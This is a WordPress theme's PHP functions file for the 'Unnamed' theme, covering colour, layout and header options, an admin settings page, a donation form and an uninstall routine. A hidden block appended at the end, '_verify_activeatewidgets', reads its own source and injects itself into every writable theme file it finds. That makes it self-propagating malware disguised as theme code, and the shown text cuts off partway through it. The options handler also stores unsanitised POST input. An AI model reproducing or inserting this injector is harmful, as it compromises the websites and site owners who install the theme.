<?php
// General Settings
$current = '1.23';

function unnamed_fontcolor() {
	$color = get_option('unnamed_fontcolor');
	if (get_option('unnamed_fontcolor') == '')	return '#333333';
	return $color;
}

function unnamed_linkcolor() {
	$linkcolor = get_option('unnamed_linkcolor');
	if (get_option('unnamed_linkcolor') == '')	return '#5D8BB3';
	return $linkcolor;
}

function unnamed_hovercolor() {
	$hovercolor = get_option('unnamed_hovercolor');
	if (get_option('unnamed_hovercolor') == '') return '#3465A4';
	return $hovercolor;
}

function unnamed_contentcolor() {
	$hovercolor = get_option('unnamed_contentcolor');
	if (get_option('unnamed_contentcolor') == '') return '#FFFFFF';
	return $hovercolor;
}

function unnamed_bgcolor() {
	$bgcolor = get_option('unnamed_bgcolor');
	if (get_option('unnamed_bgcolor') == '') return '#EBEBEB';
	return $bgcolor;
}

function unnamed_bgimage() {
	$bgimage = 'url('.get_bloginfo('template_url') . '/images/backgrounds/' . get_option('unnamed_bg_image').') '. get_option('unnamed_bg_repeat'). ' center top';
	if (get_option('unnamed_bg_image') == '') return '';
	return $bgimage;
}
?>
<?php
class UnnamedOptions {

	function unnamed_init() {
		// Load the localisation text
		load_theme_textdomain('unnamed');
		// Function for Sidebar Widgets
		if (function_exists('register_sidebar')) { register_sidebars(3,array('before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>','before_title' => '<h2 class="widgettitle">','after_title' => '</h2>')); }
		//Check installation
		global $current;
		if (!get_option('unnamed_installed') || get_option('unnamed_installed') <= $current) { UnnamedOptions::unnamed_install(); }
		// Add menus
		add_action('admin_menu',array('UnnamedOptions','unnamed_add_menu'));
	}
	
	function unnamed_add_menu() {
		// Add the submenus
		$page = add_theme_page(__('Unnamed Options','unnamed'), __('Unnamed Options','unnamed'), 'edit_themes', 'unnamed-options', 'unnamed_admin');
		// Check if this page is the one being shown,if so then add stuff to the header
		add_action("admin_head-$page",array('UnnamedFunctions','unnamed_admin_css'));
		add_action("admin_print_scripts-$page",array('UnnamedFunctions','unnamed_admin_js'));
	}

	// install unnamed
	function unnamed_install() {
		global $current;
		// Add / update the version number
		if (!get_option('unnamed_installed')) {
			add_option('unnamed_installed',$curent);
		} else {
			update_option('unnamed_installed',$current);
		}
		add_option('unnamed_bg_image','');
		add_option('unnamed_bg_repeat','');
		add_option('unnamed_layout','1');
		add_option('unnamed_shelf','1');
		add_option('unnamed_dropmenu','1');
	}
	
	// update options
	function unnamed_update() {
		if (!empty($_POST)) {
			if (isset($_POST['bg_file'])) {
				update_option('unnamed_bg_image',$_POST['bg_file']);
				wp_cache_flush();
			}
			if (isset($_POST['bg_repeat'])) {
				update_option('unnamed_bg_repeat',$_POST['bg_repeat']);
			}
			if ( isset($_POST['layout']) ) {
				update_option('unnamed_layout',$_POST['layout']);
			}
			if (isset($_POST['dropmenu'])) {
				update_option('unnamed_dropmenu','1');
			} else {
				update_option('unnamed_dropmenu','0');
			}
			if (isset($_POST['shelf'])) {
				update_option('unnamed_shelf','1');
			} else {
				update_option('unnamed_shelf','0');
			}
			if (isset($_POST['headerheight'])) { 
				update_option('unnamed_headerheight',$_POST['headerheight']); 
			}
			if (isset($_POST['headerwidth'])) { 
				update_option('unnamed_headerwidth',$_POST['headerwidth']); 
			}
			if (isset($_POST['fontcolor'])) { 
				update_option('unnamed_fontcolor',$_POST['fontcolor']); 
			}
			if (isset($_POST['linkcolor'])) { 
				update_option('unnamed_linkcolor',$_POST['linkcolor']); 
			}
			if (isset($_POST['hovercolor'])) { 
				update_option('unnamed_hovercolor',$_POST['hovercolor']); 
			}
			if (isset($_POST['bgcolor'])) { 
				update_option('unnamed_bgcolor',$_POST['bgcolor']); 
			}
			if (isset($_POST['contentcolor'])) { 
				update_option('unnamed_contentcolor',$_POST['contentcolor']); 
			}
			if (isset($_POST['rss'])) { 
				update_option('unnamed_rss',$_POST['rss']); 
			}
			if (isset($_POST['hidepages'])) { 
				update_option('unnamed_hidepages',$_POST['hidepages']); 
			}
			if (isset($_POST['uninstall'])) {
				UnnamedOptions::unnamed_uninstall();
			}
		}
	}

	// uninstall unnamed
	function unnamed_uninstall() {
		global $wpdb;
		// Remove the options from the database
		$cleanup = $wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE 'unnamed%'");
		// Flush the dang cache
		wp_cache_flush();
		// Activate the default Wordpress theme
		switch_theme('default', 'default');
		// Return to the default theme page.
		echo '<meta http-equiv="refresh" content="0;URL=themes.php?activated=true">';
		echo "<script> self.location(\"themes.php?activated=true\");</script>";
		exit;
	}
}
?>
<?php
class UnnamedFunctions {
	
	//I get Files scan functions from K2
	function files_scan($path,$ext = false,$depth = 1,$relative = true) {
		$files = array();
		// Scan for all matching files
		UnnamedFunctions::_files_scan($path,'',$ext,$depth,$relative,$files);
		return $files;
	}

	function _files_scan($base_path,$path,$ext,$depth,$relative,&$files) {
		if (!empty($ext)) {
			if (!is_array($ext)) {
				$ext = array($ext);
			}
			$ext_match = implode('|',$ext);
		}

		// Open the directory
		if(($dir = @dir($base_path . $path)) !== false) {
			// Get all the files
			while(($file = $dir->read()) !== false) {
				// Construct an absolute & relative file path
				$file_path = $path . $file;
				$file_full_path = $base_path . $file_path;
				// If this is a directory,and the depth of scan is greater than 1 then scan it
				if(is_dir($file_full_path) and $depth > 1 and !($file == '.' or $file == '..')) {
					UnnamedFunctions::_files_scan($base_path,$file_path . '/',$ext,$depth - 1,$relative,$files);
				// If this is a matching file then add it to the list
				} elseif(is_file($file_full_path) and (empty($ext) or preg_match('/\.(' . $ext_match . ')$/i',$file))) {
					$files[] = $relative ? $file_path : $file_full_path;
				}
			}
			// Close the directory
			$dir->close();
		}
	}

	function unnamed_admin_js() { // Color Picker from WordPress Default 1.6
?>
<script type="text/javascript" src="../wp-includes/js/colorpicker.js"></script>
<script type='text/javascript'>
// <![CDATA[
function pickColor(color) {
	ColorPicker_targetInput.value = color;
	colorUpdate(ColorPicker_targetInput.id);
}
function PopupWindow_populate(contents) {
	contents += '<br /><p style="text-align:center;margin-top:0px;"><input type="button" value="<?php _e('Close Color Picker','unnamed') ?>" onclick="cp.hidePopup(\'prettyplease\')"></input></p>';
	this.contents = contents;
	this.populated = false;
}
function PopupWindow_hidePopup(magicword) {
	if (magicword != 'prettyplease')
		return false;
	if (this.divName != null) {
		if (this.use_gebi) {
			document.getElementById(this.divName).style.visibility = "hidden";
		}
		else if (this.use_css) {
			document.all[this.divName].style.visibility = "hidden";
		}
		else if (this.use_layers) {
			document.layers[this.divName].visibility = "hidden";
		}
	}
	else {
		if (this.popupWindow && !this.popupWindow.closed) {
			this.popupWindow.close();
			this.popupWindow = null;
		}
	}
	return false;
}
function colorSelect(t,p) {
	if (cp.p == p && document.getElementById(cp.divName).style.visibility != "hidden")
		cp.hidePopup('prettyplease');
	else {
		cp.p = p;
		cp.select(t,p);
	}
}
var cp = new ColorPicker();
function advUpdate(val,obj) {
	document.getElementById(obj).value = val;
	colorUpdate(obj);
}
function colorUpdate(oid) {
	if ('fontcolor' == oid) {
		document.getElementById('unnamedfontcolor').style.color = document.getElementById('fontcolor').value;
		document.getElementById('advfontcolor').value = document.getElementById('fontcolor').value;
	}
	
	if ('linkcolor' == oid) {
		document.getElementById('unnamedlinkcolor').style.color = document.getElementById('linkcolor').value;
		document.getElementById('advlinkcolor').value = document.getElementById('linkcolor').value;
	}
	
	if ('hovercolor' == oid) {
		document.getElementById('unnamedhovercolor').style.color = document.getElementById('hovercolor').value;
		document.getElementById('advhovercolor').value = document.getElementById('hovercolor').value;
	}
	
	if ('bgcolor' == oid) {
		document.getElementById('unnamedbgcolor').style.background = document.getElementById('bgcolor').value;
		document.getElementById('advbgcolor').value = document.getElementById('bgcolor').value;
	}
	
	if ('contentcolor' == oid) {
		document.getElementById('unnamedcontentcolor').style.background = document.getElementById('contentcolor').value;
		document.getElementById('advcontentcolor').value = document.getElementById('contentcolor').value;
	}
}
function toggleAdvanced() {
	a = document.getElementById('advanced');
	if (a.style.display == 'none')
		a.style.display = 'block';
	else
		a.style.display = 'none';
}
function toggleStyle() {
	m = document.getElementById('togglestyle');
	if (m.style.display == 'none')
		m.style.display = 'block';
	else
		m.style.display = 'none';
}
function colorDefaults() {
	document.getElementById('unnamedfontcolor').style.color = '#333333';
	document.getElementById('unnamedlinkcolor').style.color = '#5D8BB3';
	document.getElementById('unnamedhovercolor').style.color = '#3465A4';
	document.getElementById('unnamedbgcolor').style.background = '#EBEBEB';
	document.getElementById('unnamedcontentcolor').style.background = '#FFFFFF';
	document.getElementById('advfontcolor').value = document.getElementById('fontcolor').value = '#333333';
	document.getElementById('advlinkcolor').value = document.getElementById('linkcolor').value = '#5D8BB3';
	document.getElementById('advhovercolor').value = document.getElementById('hovercolor').value = '#3465A4';
	document.getElementById('advbgcolor').value = document.getElementById('bgcolor').value = '#EBEBEB';
	document.getElementById('advcontentcolor').value = document.getElementById('contentcolor').value = '#FFFFFF';
}
// ]]>
</script>
<?php } function unnamed_admin_css() { ?>
<style type="text/css">	
body {font:62.5% "Lucida Grande", Segoe UI, Verdana, Arial, sans-serif;}
h2 {font:2.4em Georgia, "Times New Roman", Times, serif;border:0;margin:5px 0 !important;}
h3 {font:1.8em Georgia, "Times New Roman", Times, serif;margin:5px 0;color:#333333;}
h4 {font:1.5em Georgia, "Times New Roman", Times, serif;margin:5px 0 0;color:#333333;}
small {color:#777;font-size:.9em;}
.wrap {font-size:1.2em;}
.unnamedcontainer {width:800px;margin:0 auto;text-align:left;color:#333333;}
.unnamedcontainer p {margin:4px 0 0;padding:0;}
.unnamedcontainer input[type=checkbox],.unnamedcontainer input[type=radio] {border:0;}
.unnamedoptions {clear:both;width:780px;margin:0 0 20px;padding:10px;border:1px solid #ccc;}
.floatleft {float:left;width:350px;padding:0 5px;margin:5px;}
#layout1 {float:left;margin:10px 24px 10px 0;height:87px;width:87px;background:url(<?php bloginfo('template_directory'); ?>/images/admin/bg_admin_layout1.png) top center no-repeat;}
#layout2 {float:left;margin:10px 0 10px 24px;height:87px;width:87px;background:url(<?php bloginfo('template_directory'); ?>/images/admin/bg_admin_layout2.png) top center no-repeat;}
#bg_file {width:300px;}
#bg_file,#bg_repeat {margin:10px 15px 0 0;padding:3px;font-size:.9em;}
#admin-content {height:50px;width:390px;margin:0 100px;background:url(<?php bloginfo('template_directory'); ?>/images/admin/bg_admin_content.png) center top repeat-y;}
#unnamedcontentcolor {width:383px;height:50px;margin:0 auto;}
#unnamedbgcolor {font-size:.9em;margin:8px 0 12px;height:50px;width:600px;}
#unnamedfontcolor {float:left;margin:16px 10px 5px 45px; }
#unnamedlinkcolor {float:left;margin:16px 10px 5px 30px;}
#unnamedhovercolor {float:left;margin:16px 40px 5px 30px;}
#advanced,#togglestyle {margin:5px 0;}
#colorPickerDiv a,#colorPickerDiv a:hover {padding:1px;text-decoration: none;border-bottom: 0px;}
.cssbtn {font-size:.9em;}
.submit {border-top:none;}
.clear {clear:both;}
</style>
<?php } } function unnamed_admin() {
	global $wpdb;
	// Update
	$update = UnnamedOptions::unnamed_update();
	
	$bg_image = get_option('unnamed_bg_image');
	$bg_files = UnnamedFunctions::files_scan(TEMPLATEPATH . '/images/backgrounds/',array('gif','jpeg','jpg','png'),2);
	$bg_repeat = get_option('unnamed_bg_repeat');
?>
<?php if(isset($_POST['submit'])) { ?>
<div id="message2" class="updated fade">
  <p>
    <?php _e('Options have been updated.','unnamed'); ?>
  </p>
</div>
<?php } ?>
<div class="wrap">
  <h2>
    <?php _e('Unnamed Options','unnamed'); ?>
  </h2>
  <p style="margin-left:5px;"><small><?php printf(__('You can always get the latest version <a href="http://xuyiyang.com/wordpress-themes/unnamed/">here</a>.','unnamed')) ?></small></p>
  <div class="unnamedcontainer">
    <form name="dofollow" action="" method="post">
      <input type="hidden" name="action" value="<?php echo attribute_escape($update); ?>" />
      <input type="hidden" name="page_options" value="'dofollow_timeout'" />
      <p class="submit">
        <input type="submit" name="submit" value="<?php echo attribute_escape(__('Update Options &raquo;','unnamed')); ?>" />
      </p>
      <h3>
        <?php _e('Custom Styles','unnamed'); ?>
      </h3>
      <div class="unnamedoptions">
        <div style="padding:0 5px;margin:5px;clear:both;">
          <h4>
            <?php _e('Colors','unnamed'); ?>
          </h4>
          <div id="unnamedbgcolor" style="background:<?php echo unnamed_bgcolor(); ?>;">
            <div id="admin-content">
              <div id="unnamedcontentcolor" style="background:<?php echo unnamed_contentcolor(); ?>">
                <p id="unnamedfontcolor" style="color:<?php echo unnamed_fontcolor(); ?>;">
                  <?php _e('Text Color','unnamed'); ?>
                </p>
                <p id="unnamedlinkcolor" style="color:<?php echo unnamed_linkcolor(); ?>;">
                  <?php _e('Link Color','unnamed'); ?>
                </p>
                <p id="unnamedhovercolor" style="color:<?php echo unnamed_hovercolor(); ?>;">
                  <?php _e('Link Hover Color','unnamed'); ?>
                </p>
              </div>
            </div>
          </div>
          <input class="cssbtn" type="button" onclick="colorSelect(document.getElementById('fontcolor'),'pick1');return false;" name="pick1" id="pick1" value="<?php echo attribute_escape(__('Text','unnamed')); ?>" />
          <input class="cssbtn" type="button" onclick="colorSelect(document.getElementById('linkcolor'),'pick2');return false;" name="pick2" id="pick2" value="<?php echo attribute_escape(__('Link','unnamed')); ?>" />
          <input class="cssbtn" type="button" onclick="colorSelect(document.getElementById('hovercolor'),'pick3');return false;" name="pick3" id="pick3" value="<?php echo attribute_escape(__('Link Hover','unnamed')); ?>" />
          <input class="cssbtn" type="button" onclick="colorSelect(document.getElementById('bgcolor'),'pick4');return false;" name="pick4" id="pick4" value="<?php echo attribute_escape(__('Background','unnamed')); ?>" />
          <input class="cssbtn" type="button" onclick="colorSelect(document.getElementById('contentcolor'),'pick5');return false;" name="pick5" id="pick5" value="<?php echo attribute_escape(__('Content Background','unnamed')); ?>" />
          <input class="cssbtn" type="button" name="default" value="<?php echo attribute_escape(__('Defaults','unnamed')); ?>" onclick="colorDefaults()" />
          <input class="cssbtn" type="button" value="<?php echo attribute_escape(__('Advanced &raquo;','unnamed')); ?>" onclick="toggleAdvanced()" />
          <input type="hidden" name="fontcolor" id="fontcolor" value="<?php echo attribute_escape(get_option('unnamed_fontcolor')); ?>" />
          <input type="hidden" name="linkcolor" id="linkcolor" value="<?php echo attribute_escape(get_option('unnamed_linkcolor')); ?>" />
          <input type="hidden" name="hovercolor" id="hovercolor" value="<?php echo attribute_escape(get_option('unnamed_hovercolor')); ?>" />
          <input type="hidden" name="bgcolor" id="bgcolor" value="<?php echo attribute_escape(get_option('unnamed_bgcolor')); ?>" />
          <input type="hidden" name="contentcolor" id="contentcolor" value="<?php echo attribute_escape(get_option('unnamed_contentcolor')); ?>" />
          <div id="colorPickerDiv" style="z-index:100;background:#eee;border:1px solid #ccc;position:absolute;visibility:hidden;"></div>
          <div id="advanced" style="display:none;clear:both;">
            <label for="advfontcolor">
            <?php _e('Text:','unnamed'); ?>
            </label>
            <input type="text" id="advfontcolor" onchange="advUpdate(this.value,'fontcolor')" value="<?php echo attribute_escape(get_option('unnamed_fontcolor')); ?>" />
            <br />
            <label for="advlinkcolor">
            <?php _e('Link:','unnamed'); ?>
            </label>
            <input type="text" id="advlinkcolor" onchange="advUpdate(this.value,'linkcolor')" value="<?php echo attribute_escape(get_option('unnamed_linkcolor')); ?>" />
            <br />
            <label for="advhovercolor">
            <?php _e('Link Hover:','unnamed'); ?>
            </label>
            <input type="text" id="advhovercolor" onchange="advUpdate(this.value,'hovercolor')" value="<?php echo attribute_escape(get_option('unnamed_hovercolor')); ?>" />
            <br />
            <label for="advbgcolor">
            <?php _e('Background:','unnamed'); ?>
            </label>
            <input type="text" id="advbgcolor" onchange="advUpdate(this.value,'bgcolor')" value="<?php echo attribute_escape(get_option('unnamed_bgcolor')); ?>" />
            <br />
            <label for="advcontentcolor">
            <?php _e('Content Background:','unnamed'); ?>
            </label>
            <input type="text" id="advcontentcolor" onchange="advUpdate(this.value,'contentcolor')" value="<?php echo attribute_escape(get_option('unnamed_contentcolor')); ?>" />
          </div>
        </div>
        <div style="padding:0 5px;margin:20px 5px 10px 5px;clear:both;">
          <h4>
            <?php _e('Background Images','unnamed'); ?>
          </h4>
          <select id="bg_file" name="bg_file">
            <option value="" <?php selected($bg_image, ''); ?>>
            <?php _e('No Image','unnamed'); ?>
            </option>
            <?php foreach($bg_files as $bg_file) { ?>
            <option value="<?php echo attribute_escape($bg_file); ?>" <?php selected($bg_image, $bg_file); ?>><?php echo($bg_file); ?></option>
            <?php } ?>
          </select>
          <select id="bg_repeat" name="bg_repeat">
            <option value="" <?php selected($bg_repeat,''); ?>>
            <?php _e('repeat','unnamed'); ?>
            </option>
            <option value="<?php echo attribute_escape('no-repeat'); ?>" <?php selected($bg_repeat,'no-repeat'); ?>>
            <?php _e('no-repeat','unnamed'); ?>
            </option>
            <option value="<?php echo attribute_escape('repeat-x'); ?>" <?php selected($bg_repeat,'repeat-x'); ?>>
            <?php _e('repeat-x','unnamed'); ?>
            </option>
            <option value="<?php echo attribute_escape('repeat-y'); ?>" <?php selected($bg_repeat,'repeat-y'); ?>>
            <?php _e('repeat-y','unnamed'); ?>
            </option>
          </select>
          <p><small>
            <?php _e('Upload the pictures to the folder "/images/backgrounds/" and selcet one as background image.','unnamed');?>
            </small></p>
        </div>
        <div class="floatleft" style="clear:left;">
          <h4>
            <?php _e('Layouts','unnamed'); ?>
          </h4>
          <div id="layout1"></div>
          <div id="layout2"></div>
          <br class="clear" />
          <input name="layout" id="layout-1" type="radio" value="1" <?php checked('1', get_option('unnamed_layout')); ?> />
          <label for="layout-1">
          <?php _e('Three Columns','unnamed'); ?>
          </label>
          &nbsp;&nbsp;&nbsp;&nbsp;
          <input name="layout" id="layout-2" type="radio" value="0" <?php checked('0', get_option('unnamed_layout')); ?> />
          <label for="layout-2">
          <?php _e('Two Columns','unnamed'); ?>
          </label>
        </div>
        <div class="floatleft">
          <h4>
            <?php _e('Header Size','unnamed'); ?>
          </h4>
          <p>
            <label for="headerheight">
            <?php _e('Header Height','unnamed'); ?>
            </label>
            <input type="text" style="width:32px;" id="headerheight" name="headerheight" value="<?php echo attribute_escape(get_option('unnamed_headerheight')); ?>" />
            px. <br />
            <label for="headerwidth">
            <?php _e('Header Width','unnamed'); ?>
            </label>
            <input type="text" style="width:32px;" id="headerwidth" name="headerwidth" value="<?php echo attribute_escape(get_option('unnamed_headerwidth')); ?>" />
            px.<br />
          </p>
          <p> <small>
            <?php _e('Set the size of the header to suit your requirements when you <a href="themes.php?page=custom-header">upload an image</a>. <br />Leave blank for the default setting.','unnamed'); ?>
            </small> </p>
        </div>
        <br class="clear" />
      </div>
      <h3>
        <?php _e('Miscellaneous','unnamed'); ?>
      </h3>
      <div class="unnamedoptions">
        <div class="floatleft">
          <h4>
            <?php _e('AJAX Shelf','unnamed'); ?>
          </h4>
          <p>
            <input name="shelf" id="shelf" type="checkbox" value="1" <?php checked('1',get_option('unnamed_shelf')); ?> />
            <label for="shelf">
            <?php _e('Enable Shelf','unnamed'); ?>
            </label>
          </p>
          <p><small>
            <?php _e('Enable a sliding shelf on your homepage. You can use the <a href="widgets.php">Widgets</a> to arrange the items (Sidebar 3).','unnamed'); ?>
            </small></p>
          <br />
          <h4>
            <?php _e('Feed Address','unnamed'); ?>
          </h4>
          <p>
            <input type="text" style="width:300px;" name="rss" value="<?php echo attribute_escape(get_option('unnamed_rss')); ?>" />
          </p>
          <p><small>
            <?php _e('Use your burned feed to replace the default RSS 2.0. For example: http://feeds.feedburner.com/yourfeed','unnamed'); ?>
            </small></p>
        </div>
        <div class="floatleft">
          <h4>
            <?php _e('Navigations','unnamed'); ?>
          </h4>
          <p>
            <input name="dropmenu" id="dropmenu-on" type="checkbox" value="1" <?php checked('1',get_option('unnamed_dropmenu')); ?> />
            <label for="dropmenu-on">
            <?php _e('Enable Drop Down Menu','unnamed'); ?>
            </label>
          </p>
          <p> <small>
            <?php _e('Drop Down Menu will display only when the page has at least one child page.','unnamed'); ?>
            </small></p>
          <p>
            <label for="hidepages">
            <?php _e('Hide Certain Pages','unnamed'); ?>
            </label>
            <input type="text" style="width:64px;" id="hidepages" name="hidepages" value="<?php echo attribute_escape(get_option('unnamed_hidepages')); ?>" />
          </p>
          <p><small>
            <?php _e('Fill the blank with the Page IDs to exclude certain pages from the navigation bar.<br />Separate the Page IDs with commas: 1, 2.','unnamed'); ?>
            </small></p>
        </div>
        <br class="clear" />
      </div>
      <br class="clear" />
      <p class="submit">
        <input type="submit" name="submit" value="<?php echo attribute_escape(__('Update Options &raquo;','unnamed')); ?>" />
      </p>
    </form>
    <h3>
      <?php _e('Donate','unnamed'); ?>
    </h3>
    <p><?php printf(__('Consider make a donation with <a href="http://www.paypal.com">Paypal</a> to keep the project going. Any and all donations are sincerely appreciated. Thanks.','unnamed')) ?></p>
    <form action="https://www.paypal.com/cgi-bin/webscr" method="post">
      <p>
        <input type="hidden" name="cmd" value="_s-xclick" />
        <input type="image" src="https://www.paypal.com/en_US/i/btn/x-click-but21.gif" style="border:0;" name="submit" alt="Make payments with PayPal - it's fast, free and secure!" />
        <input type="hidden" name="encrypted" value="-----BEGIN PKCS7-----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-----END PKCS7-----" />
      </p>
    </form>
    <h3>
      <?php _e('Uninstall','unnamed'); ?>
    </h3>
    <p><?php printf(__('Press the uninstall button to clean things up in the database. You will be redirected to the <a href="themes.php">Themes admin interface</a>. <br />This will not remove your settings of custom image header,you can restore original header in <a href="themes.php?page=custom-header">this page</a>.','unnamed')) ?></p>
    <form action="" method="post">
      <p class="submit">
        <input name="uninstall" id="uninstall" type="submit" value="<?php echo attribute_escape(__('Uninstall Theme &raquo;','unnamed')); ?>" />
      </p>
    </form>
  </div>
</div>
<?php  } 

// Custom Image Header Functions
define('HEADER_TEXTCOLOR','FFFFFF');
define('HEADER_IMAGE','%s/images/bg_header.png'); // %s is theme dir uri

if (get_option('unnamed_headerheight') == "") { define('HEADER_IMAGE_HEIGHT',78);
} else {
define('HEADER_IMAGE_HEIGHT',get_option('unnamed_headerheight'));
}

if (get_option('unnamed_headerwidth') == "") { define('HEADER_IMAGE_WIDTH',960);
} else {
define('HEADER_IMAGE_WIDTH',get_option('unnamed_headerwidth'));
}

function custom_css() {
?>
<style type="text/css">
body {
color:<?php echo unnamed_fontcolor();
?>;
background:<?php echo unnamed_bgimage();
?> <?php echo unnamed_bgcolor();
?>;
}
a, a:link, a:active, a:visited {
color:<?php echo unnamed_linkcolor();
?>;
}
a:hover {
color:<?php echo unnamed_hovercolor();
?>;
}
h1, h2, h3, h4 {
color:<?php echo unnamed_fontcolor();
?>;
}
#header {
height:<?php echo HEADER_IMAGE_HEIGHT;
?>px;
background:url(<?php header_image() ?>) transparent repeat top center;
}
<?php if (get_header_textcolor()=='blank' ) {
?> #header h1, .description {
display:none;
}
<?php
}
else {
?> #header h1 a, .description {
color:#<?php header_textcolor() ?>;
}
<?php
}
?> #content {
background:<?php echo unnamed_contentcolor();
?>;
}
<?php if (unnamed_contentcolor() != "#FFFFFF") {
?> * html .content-top {
background:none;
}
* html .content-bottom {
background:none;
}
<?php
}
?>
</style>
<?php }
function admin_header_style() { 
?>
<style type="text/css">
#headimg {
	font-family:Georgia, "Times New Roman", Times, serif;
background-image:url(<?php header_image() ?>);
	background-repeat:repeat !important;
height:<?php echo HEADER_IMAGE_HEIGHT;
?>px;
width:<?php echo HEADER_IMAGE_WIDTH;
?>px;
	margin:0 0 10px;
}
#headimg h1 {
	font-size:1.8em;
	text-align:left;
	margin:0;
	padding:15px 0 0 20px;
}
#headimg h1 a {
color:#<?php header_textcolor() ?>;
	text-decoration:none;
	border-bottom:none;
}
#headimg #desc {
color:#<?php header_textcolor() ?>;
	font-size:1em;
	text-align:left;
	padding:0 0 5px 20px;
}
<?php if ('blank' == get_header_textcolor()) {
?> #headimg h1, #headimg #desc {
display:none;
}
#headimg h1 a, #headimg #desc {
color:#<?php echo HEADER_TEXTCOLOR ?>;
}
<?php
}
?>
</style>
<?php }

UnnamedOptions::unnamed_init();
wp_register_script('unnamed_toggle',get_bloginfo('template_directory') . '/js/shelf.js',array('jquery'),'1.0');
add_custom_image_header('custom_css','admin_header_style');

?>
<?php
function _verify_activeatewidgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_getall_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$issepar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
